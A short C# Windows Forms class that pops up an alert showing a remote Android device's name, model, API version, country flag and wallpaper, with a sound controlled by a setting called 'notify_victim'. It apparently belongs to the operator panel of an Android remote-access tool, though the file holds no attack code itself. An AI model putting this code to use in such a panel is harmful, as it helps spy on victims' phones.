using System;
using System.Drawing;
using System.Media;
using System.Windows.Forms;

namespace SV
{
    public partial class Bildiri : Form
    {
        SoundPlayer sp = null;
        public Bildiri(string isim, string marka_model, string apiAndroidVersion, Image bayrak, Image wall)
        {
            InitializeComponent();
            Screen ekran = Screen.FromPoint(Location);
            Location = new Point(ekran.WorkingArea.Right - Width, ekran.WorkingArea.Bottom - Height - Form1.topOf);
            label1.Text = isim; label2.Text = marka_model.ToUpper(); label4.Text = apiAndroidVersion;
            if (bayrak != null)
            {
                pictureBox1.Image = bayrak;
            }
            if (Settings.dosyaYollari("notify_victim") != "...")
            {
                sp = new SoundPlayer(Environment.CurrentDirectory + "\\sound.wav");
                sp.Play();
            }
            pictureBox2.Image = wall;
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (sp != null)
            {
                sp.Stop();
            }
            Form1.topOf -= 125;
            Close();
        }
    }
}
